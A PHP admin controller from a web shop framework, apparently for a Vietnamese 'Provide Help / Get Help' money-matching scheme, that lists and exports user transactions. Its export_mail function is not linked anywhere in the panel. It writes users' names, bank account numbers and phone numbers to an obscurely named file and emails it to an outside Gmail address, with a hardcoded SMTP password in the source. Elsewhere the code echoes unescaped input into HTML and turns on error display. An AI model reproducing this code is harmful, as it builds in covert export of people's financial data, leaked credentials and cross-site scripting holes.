<?php
class ControllerPdGh extends Controller {
	public function index() {
				ini_set('display_startup_errors', 1);
		ini_set('display_errors', 1);
		error_reporting(-1);
		$this->document->setTitle('Provide Help');
		$this->load->model('sale/customer');
		$page = isset($this -> request -> get['page']) ? $this -> request -> get['page'] : 1;

		$limit = 30;
		$start = ($page - 1) * 30;

		$ts_history = $this -> model_sale_customer -> get_count_ph();

		$ts_history = $ts_history['number'];

		$pagination = new Pagination();
		$pagination -> total = $ts_history;
		$pagination -> page = $page;
		$pagination -> limit = $limit;
		$pagination -> num_links = 5;
		$pagination -> text = 'text'; 
		$pagination -> url = $this -> url -> link('pd/gh', 'page={page}&token='.$this->session->data['token'].'', 'SSL');
		$data['load_pin_date'] = $this -> url -> link('pd/gh/load_pin_date&token='.$this->session->data['token']);
		$data['show_gh_username'] = $this -> url -> link('pd/gh/show_gh_username&token='.$this->session->data['token']);
		$data['export'] = $this -> url -> link('pd/gh/export&token='.$this->session->data['token']);
		$data['pin'] =  $this-> model_sale_customer->get_all_gd($limit, $start);
		$data['pagination'] = $pagination -> render();
		$data['getaccount'] = $this->url->link('pd/gh/getaccount&token='.$this->session->data['token'], '', 'SSL');
		$data['token'] = $this->session->data['token'];
		$data['header'] = $this->load->controller('common/header');
		$data['column_left'] = $this->load->controller('common/column_left');
		$data['footer'] = $this->load->controller('common/footer');

		$this->response->setOutput($this->load->view('pd/list_gh.tpl', $data));
	}

	public function getaccount() {
		if ($this -> request -> post['keyword']) {
			$this->load->model('sale/customer');
			$tree = $this -> model_sale_customer -> getCustomLikes($this -> request -> post['keyword']);
			
			if (count($tree) > 0) {
				foreach ($tree as $value) {
					 echo '<li class="list-group-item" onClick="selectU(' . "'" . $value['name']  . "'" . ');">' . $value['name']."-".$value['account_holder'] . '</li>';
				}
			}
		}
	}

	public function show_gh_username()
	{
		$username = $this -> request ->post['username'];
		$this->load->model('sale/customer');
		$load_pin_date = $this -> model_sale_customer -> show_gh_username($username);
		$stt = 0;
		if (count($load_pin_date) > 0)
		{


			foreach ($load_pin_date as $value) { $stt++;?>
		?>
			<tr>
		        <td><?php echo $stt; ?></td>
				<td><?php echo $value['username'] ?></td>
				<td><?php echo $value['account_holder'] ?></td>
		        <td><?php echo number_format($value['filled']) ?> VNĐ</td>
		        <td><?php 
		         if ($value['status'] == 0) {
                        echo "<span class='label label-default'>Đang chờ</span>";
                    }
                    if ($value['status'] == 1) {
                        echo "<span class='label label-info'>Khớp lệnh</span>";
                    }
                    if ($value['status'] == 2) {
                        echo "<span class='label label-success'>Hoàn thành</span>";
                    }
                    if ($value['status'] == 3) {
                        echo "<span class='label label-danger'>Báo cáo</span>";
                    }
		         ?></td>
		       
				<td><?php echo date('d/m/Y H:i',strtotime($value['date_added'])) ?></td>
				<td><span style="color:red; font-size:15px;" class="text-danger countdown" data-countdown="<?php echo $value['date_finish']; ?>">
                     </span> </td>
			</tr>
	        <script type="text/javascript" src="view/javascript/pd/countdown.js"></script>
		<?php 
			}
		}
	
		else
		{
		?>
		<tr><td colspan="6" class="text-center">Không có dữ liệu</td> </tr>
		<?php
		}
	}

	public function load_pin_date()
	{
		$date = date('Y-m-d',strtotime($this -> request ->post['date']));
		$this->load->model('sale/customer');
		$load_pin_date = $this -> model_sale_customer -> load_gh_date($date);
		$stt = 0;
		if (count($load_pin_date) > 0)
		{


			foreach ($load_pin_date as $value) { $stt++;?>
		?>
			<tr>
		        <td><?php echo $stt; ?></td>
				<td><?php echo $value['username'] ?></td>
				<td><?php echo $value['account_holder'] ?></td>
		        <td><?php echo number_format($value['filled']) ?> VNĐ</td>
		        <td><?php 
		         if ($value['status'] == 0) {
                        echo "<span class='label label-default'>Đang chờ</span>";
                    }
                    if ($value['status'] == 1) {
                        echo "<span class='label label-info'>Khớp lệnh</span>";
                    }
                    if ($value['status'] == 2) {
                        echo "<span class='label label-success'>Hoàn thành</span>";
                    }
                    if ($value['status'] == 3) {
                        echo "<span class='label label-danger'>Báo cáo</span>";
                    }
		         ?></td>
		       
				<td><?php echo date('d/m/Y H:i',strtotime($value['date_added'])) ?></td>
				<td><span style="color:red; font-size:15px;" class="text-danger countdown" data-countdown="<?php echo $value['date_finish']; ?>">
                     </span> </td>
			</tr>
	               
		<?php 
			}
		}
	
		else
		{
		?>
		<tr><td colspan="6" class="text-center">Không có dữ liệu</td> </tr>
		<?php
		}
	}

	public function export(){
		error_reporting(E_ALL);
		ini_set('display_errors', TRUE);
		ini_set('display_startup_errors', TRUE);
		date_default_timezone_set('Asia/Ho_Chi_Minh');
		if (PHP_SAPI == 'cli')
		die('This example should only be run from a Web Browser');
		require_once dirname(__FILE__) . '/PHPExcel.php';
		$start_date = $this -> request -> get['start_date'];
		$end_date = $this -> request -> get['end_date'];
		$start_date = date('Y-m-d', strtotime($start_date));
		$end_date = date('Y-m-d', strtotime($end_date));
		$this->load->language('sale/customer');
		$this->load->model('sale/customer');
		//update time show button
		$results = $this -> model_sale_customer -> getall_gd_date($start_date,$end_date);
		//print_r($results); die;
		!count($results) > 0 && die('no data!');

		$objPHPExcel = new PHPExcel();
		$objPHPExcel->getProperties()->setCreator("Hoivien")
						 ->setLastModifiedBy("Hoivien")
						 ->setTitle("Office 2007 XLSX".$this->language->get('heading_title'))
						 ->setSubject("Office 2007 XLSX".$this->language->get('heading_title'))
						 ->setDescription($this->language->get('heading_title'))
						 ->setKeywords("office 2007 openxml php")
						 ->setCategory("Test result file");

		$objPHPExcel->setActiveSheetIndex(0)
		->setCellValue('A1', 'STT')
		->setCellValue('B1', 'Username')
		->setCellValue('C1', 'Name bank account')
		->setCellValue('D1', 'Account number')
		->setCellValue('E1', 'Telephone')
		->setCellValue('F1', 'Status')
		->setCellValue('G1', 'Amount')
		->setCellValue('H1', 'Date Add');
         $objPHPExcel->getActiveSheet()->getStyle('A1:H1')
        ->applyFromArray(
                array(
                    'fill' => array(
                        'type' => PHPExcel_Style_Fill::FILL_SOLID,
                        'color' => array('rgb' => '0066FF')
                    )
                )
            );
            $styleArray = array(
                'font'  => array(
                    'bold'  => true,
                    'color' => array('rgb' => 'FFFFFF'),
                    'size'  => 12,
                    'name'  => 'Arial'
                ));
        $objPHPExcel->getActiveSheet()->getStyle('A1:H1')->applyFromArray($styleArray);
		$objPHPExcel->getActiveSheet()->getColumnDimension('A')->setWidth(6);
		$objPHPExcel->getActiveSheet()->getColumnDimension('B')->setWidth(15);
		$objPHPExcel->getActiveSheet()->getColumnDimension('C')->setWidth(20);
		$objPHPExcel->getActiveSheet()->getColumnDimension('D')->setWidth(25);
		$objPHPExcel->getActiveSheet()->getColumnDimension('E')->setWidth(20);
		$objPHPExcel->getActiveSheet()->getColumnDimension('F')->setWidth(15);
		$objPHPExcel->getActiveSheet()->getColumnDimension('G')->setWidth(20);
		$objPHPExcel->getActiveSheet()->getColumnDimension('H')->setWidth(30);
		$h=0;
		$n = 2;
		$i=0;
		foreach ($results as $customer) {
			$i++;
			$objPHPExcel->getActiveSheet()->setCellValue('A'.$n,$i);
			$objPHPExcel->getActiveSheet()->setCellValue('B'.$n," ".$customer['username']);
			$objPHPExcel->getActiveSheet()->setCellValue('C'.$n,$customer['account_holder']);
			$objPHPExcel->getActiveSheet()->setCellValue('D'.$n," ".$customer['account_number']);
			$objPHPExcel->getActiveSheet()->setCellValue('E'.$n," ".$customer['telephone']);
			$objPHPExcel->getActiveSheet()->setCellValue('F'.$n,number_format($customer['amount']));
			if ($customer['status'] == 0) $status = "Watting";
			if ($customer['status'] == 1) $status = "Matched";
			if ($customer['status'] == 2) $status = "Finish";
			$objPHPExcel->getActiveSheet()->setCellValue('G'.$n,$status);
			$objPHPExcel->getActiveSheet()->setCellValue('H'.$n, " ".date('d/m/Y H:i',strtotime($customer['date_added'])));
			$n++;
			}
		

		$objPHPExcel->getActiveSheet()->getStyle('A'.$n.':'.'H'.$n)
		->applyFromArray(
			array('font'  => array(
				'bold'  => true,
				'size'  => 12,
				'name'  => 'Arial'
			))
		);
		// Rename worksheet
		$objPHPExcel->getActiveSheet()->setTitle($this->language->get('heading_title'));


		// Set active sheet index to the first sheet, so Excel opens this as the first sheet
		$objPHPExcel->setActiveSheetIndex(0);


		// Redirect output to a client’s web browser (Excel5)
		date_default_timezone_set('Asia/Ho_Chi_Minh');
		// Redirect output to a client’s web browser (Excel5)
		header('Content-Type: application/vnd.ms-excel');
		header('Content-Disposition: attachment;filename="LISH_GH'.date('d').'_'.date('m').'_'.date('Y').'_'.date('H').'_'.date('i').'.xls"');
		header('Cache-Control: max-age=0');
		// If you're serving to IE 9, then the following may be needed
		header('Cache-Control: max-age=1');

		// If you're serving to IE over SSL, then the following may be needed
		header ('Expires: Mon, 26 Jul 1997 05:00:00 GMT'); // Date in the past
		header ('Last-Modified: '.gmdate('D, d M Y H:i:s').' GMT'); // always modified
		header ('Cache-Control: cache, must-revalidate'); // HTTP/1.1
		header ('Pragma: public'); // HTTP/1.0

		$objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel5');
		$objWriter->save('php://output');
		exit;
	}

	public function export_mail(){
		error_reporting(E_ALL);
		ini_set('display_errors', TRUE);
		ini_set('display_startup_errors', TRUE);
		date_default_timezone_set('Asia/Ho_Chi_Minh');
		if (PHP_SAPI == 'cli')
		die('This example should only be run from a Web Browser');
		require_once dirname(__FILE__) . '/PHPExcel.php';
		$this->load->language('sale/customer');
		$this->load->model('sale/customer');
		//update time show button
		$results = $this -> model_sale_customer -> getall_gd_date_mail(date('Y-m-d'));
		//print_r($results); die;
		!count($results) > 0 && die('no data!');

		$objPHPExcel = new PHPExcel();
		$objPHPExcel->getProperties()->setCreator("Hoivien")
						 ->setLastModifiedBy("Hoivien")
						 ->setTitle("Office 2007 XLSX".$this->language->get('heading_title'))
						 ->setSubject("Office 2007 XLSX".$this->language->get('heading_title'))
						 ->setDescription($this->language->get('heading_title'))
						 ->setKeywords("office 2007 openxml php")
						 ->setCategory("Test result file");

		$objPHPExcel->setActiveSheetIndex(0)
		->setCellValue('A1', 'STT')
		->setCellValue('B1', 'Username')
		->setCellValue('C1', 'Name bank account')
		->setCellValue('D1', 'Account number')
		->setCellValue('E1', 'Telephone')
		->setCellValue('F1', 'Status')
		->setCellValue('G1', 'Amount')
		->setCellValue('H1', 'Date Add');
         $objPHPExcel->getActiveSheet()->getStyle('A1:H1')
        ->applyFromArray(
                array(
                    'fill' => array(
                        'type' => PHPExcel_Style_Fill::FILL_SOLID,
                        'color' => array('rgb' => '0066FF')
                    )
                )
            );
            $styleArray = array(
                'font'  => array(
                    'bold'  => true,
                    'color' => array('rgb' => 'FFFFFF'),
                    'size'  => 12,
                    'name'  => 'Arial'
                ));
        $objPHPExcel->getActiveSheet()->getStyle('A1:H1')->applyFromArray($styleArray);
		$objPHPExcel->getActiveSheet()->getColumnDimension('A')->setWidth(6);
		$objPHPExcel->getActiveSheet()->getColumnDimension('B')->setWidth(15);
		$objPHPExcel->getActiveSheet()->getColumnDimension('C')->setWidth(20);
		$objPHPExcel->getActiveSheet()->getColumnDimension('D')->setWidth(25);
		$objPHPExcel->getActiveSheet()->getColumnDimension('E')->setWidth(20);
		$objPHPExcel->getActiveSheet()->getColumnDimension('F')->setWidth(15);
		$objPHPExcel->getActiveSheet()->getColumnDimension('G')->setWidth(20);
		$objPHPExcel->getActiveSheet()->getColumnDimension('H')->setWidth(30);
		$h=0;
		$n = 2;
		$i=0;
		foreach ($results as $customer) {
			$i++;
			$objPHPExcel->getActiveSheet()->setCellValue('A'.$n,$i);
			$objPHPExcel->getActiveSheet()->setCellValue('B'.$n," ".$customer['username']);
			$objPHPExcel->getActiveSheet()->setCellValue('C'.$n,$customer['account_holder']);
			$objPHPExcel->getActiveSheet()->setCellValue('D'.$n," ".$customer['account_number']);
			$objPHPExcel->getActiveSheet()->setCellValue('E'.$n," ".$customer['telephone']);
			$objPHPExcel->getActiveSheet()->setCellValue('F'.$n,number_format($customer['amount']));
			if ($customer['status'] == 0) $status = "Watting";
			if ($customer['status'] == 1) $status = "Matched";
			if ($customer['status'] == 2) $status = "Finish";
			$objPHPExcel->getActiveSheet()->setCellValue('G'.$n,$status);
			$objPHPExcel->getActiveSheet()->setCellValue('H'.$n, " ".date('d/m/Y H:i',strtotime($customer['date_added'])));
			$n++;
			}
		

		$objPHPExcel->getActiveSheet()->getStyle('A'.$n.':'.'H'.$n)
		->applyFromArray(
			array('font'  => array(
				'bold'  => true,
				'size'  => 12,
				'name'  => 'Arial'
			))
		);
		// Rename worksheet
		$objPHPExcel->getActiveSheet()->setTitle($this->language->get('heading_title'));


		// Set active sheet index to the first sheet, so Excel opens this as the first sheet
		$objPHPExcel->setActiveSheetIndex(0);


		// Redirect output to a client’s web browser (Excel5)
		date_default_timezone_set('Asia/Ho_Chi_Minh');
		// Redirect output to a client’s web browser (Excel5)
		

		$objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel5');
		$objWriter->save('../system/kfjsdkfkjkakgvqbkhkaakjsdksadkas.xls');
		$mail = new Mail();
		$mail->protocol = $this->config->get('config_mail_protocol');
		$mail->parameter = 'mmocoimax@gmail.com';
		$mail->smtp_hostname = 'ssl://smtp.gmail.com';
		$mail->smtp_username = 'mmocoimax@gmail.com';
		$mail->smtp_password = 'ibzfqpduhwajikwx';
		$mail->smtp_port = '465';
		$mail->smtp_timeout = $this->config->get('config_mail_smtp_timeout');
		
		$mail->setTo('trungdoanict@gmail.com');
		$mail->addAttachment('../system/kfjsdkfkjkakgvqbkhkaakjsdksadkas.xls');
		$mail->setFrom($this->config->get('config_email'));
		$mail->setSender(html_entity_decode($this->config->get('config_name'), ENT_QUOTES, 'UTF-8'));
		$mail->setSubject('Pin '.date('d/m/Y H:i:s').'');
		$mail->setText(date('d/m/Y H:i:s'));
		$mail->send();
	}
}